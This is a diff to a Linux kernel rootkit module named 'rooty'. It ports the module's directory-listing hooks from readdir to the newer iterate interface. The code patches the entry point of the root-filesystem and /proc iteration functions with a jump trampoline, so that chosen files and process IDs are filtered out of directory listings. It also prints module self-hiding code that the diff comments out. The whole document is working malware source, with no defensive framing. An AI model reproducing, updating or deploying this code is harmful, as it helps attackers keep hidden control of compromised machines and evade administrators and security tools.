@@ -1,4 +1,6 @@
+#include "common.h"
 #include <linux/module.h>
+#include <linux/kallsyms.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/kobject.h>
@@ -6,6 +8,9 @@
 #include <linux/slab.h>
 #include <linux/version.h>
 #include <linux/proc_fs.h>
+#include <linux/preempt.h>
+
+#include <asm/cacheflush.h>
 
 MODULE_LICENSE("GPL");
 
@@ -13,21 +18,22 @@ int rooty_init(void);
 void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
-static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
-static int (*o_root_readdir)(struct file *file, void *dirent, filldir_t filldir);
+static int (*o_proc_iterate)(struct file *file, struct dir_context *);
+static int (*o_root_iterate)(struct file *file, struct dir_context *);
+
 static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
 static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
+struct my_dir_context {
+    filldir_t actor;
+    loff_t pos;
+};
+struct my_dir_context my_r_dcont;
+struct my_dir_context my_p_dcont;
 
-#if defined(__i386__)
-#define csize 6 /* code size */
-#define jacked_code "\x68\x00\x00\x00\x00\xc3" /* push address, addr, ret */
-#define poff 1 /* pointer offset to write address to */
-#else
 #define csize 12 /* code size */
 /* mov address to register rax, jmp rax. for normal x64 convention */
 #define jacked_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
 #define poff 2
-#endif
 
 struct hook { // hijacking the prologue of the readdir function
   void *target; /* target pointer */
@@ -71,14 +77,14 @@ void fix_it(void *target) {
   }
 }
 
-void *get_readdir(const char *path) {
+void *get_iterate(const char *path) {
   void *ret;
   struct file *file;
 
   if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
     return NULL;
 
-  ret = file->f_op->readdir;
+  ret = file->f_op->iterate;
   filp_close(file,0);
 
   return ret;
@@ -93,16 +99,20 @@ static int rooty_root_filldir(void *__buff, const char *name, int namelen, loff_
   return o_root_filldir(__buff,name,namelen,offset,ino,d_type);
 }
 
-int rooty_root_readdir(struct file *file, void *dirent, filldir_t filldir) {
-  int ret;
-  o_root_filldir = filldir;
+int rooty_root_iterate ( struct file *file, struct dir_context *ctx )
+{
+    int ret;
 
-  fix_it(o_root_readdir);
-  ret = o_root_readdir(file,dirent,&rooty_root_filldir);
-  jack_it(o_root_readdir);
+    o_root_filldir = ctx->actor;
 
-  return ret;
+    fix_it(o_root_iterate);
+    *((filldir_t *)&ctx->actor) = &rooty_root_filldir;
+    ret = o_root_iterate(file, ctx);                  \
+    jack_it(o_root_iterate);
+
+    return ret;
 }
+
 
 static int rooty_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
   long pid;
@@ -118,15 +128,18 @@ static int rooty_proc_filldir(void *__buf, const char *name, int namelen, loff_t
   return o_proc_filldir(__buf,name,namelen,offset,ino,d_type);
 }
 
-int rooty_proc_readdir(struct file *file, void *dirent, filldir_t filldir) {
-  int ret;
-  o_proc_filldir = filldir;
+int rooty_proc_iterate ( struct file *file, struct dir_context *ctx )
+{
+    int ret;
 
-  fix_it(o_proc_readdir);
-  ret = o_proc_readdir(file,dirent,&rooty_proc_filldir);
-  jack_it(o_proc_readdir);
+    o_proc_filldir = ctx->actor;
 
-  return ret;
+    fix_it(o_proc_iterate);
+    *((filldir_t *)&ctx->actor) = &rooty_proc_filldir;
+    ret = o_proc_iterate(file, ctx);                  \
+    jack_it(o_proc_iterate);
+
+    return ret;
 }
 
 void save_it(void *target, void *new) {
@@ -146,25 +159,27 @@ void save_it(void *target, void *new) {
 }
 
 int rooty_init(void) {
-  /* Do kernel module hiding*/
+  /* Do kernel module hiding
+   * Vorerst auskommentiert
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
+   */
 
   /* hijack root filesystem */ 
-  o_root_readdir = get_readdir("/");
-  save_it(o_root_readdir,rooty_root_readdir);
-  jack_it(o_root_readdir);
+  o_root_iterate = get_iterate("/");
+  save_it(o_root_iterate,rooty_root_iterate);
+  jack_it(o_root_iterate);
 
   /* hijack proc filesystem */
-  o_proc_readdir = get_readdir("/proc");
-  save_it(o_proc_readdir,rooty_proc_readdir);
-  jack_it(o_proc_readdir);
+  o_proc_iterate = get_iterate("/proc");
+  save_it(o_proc_iterate,rooty_proc_iterate);
+  jack_it(o_proc_iterate);
 
   return 0;
 }
 
 void rooty_exit(void) {
-  fix_it(o_root_readdir);
-  fix_it(o_proc_readdir);
+  fix_it(o_root_iterate);
+  fix_it(o_proc_iterate);
   printk("rooty: Module unloaded\n");
 }
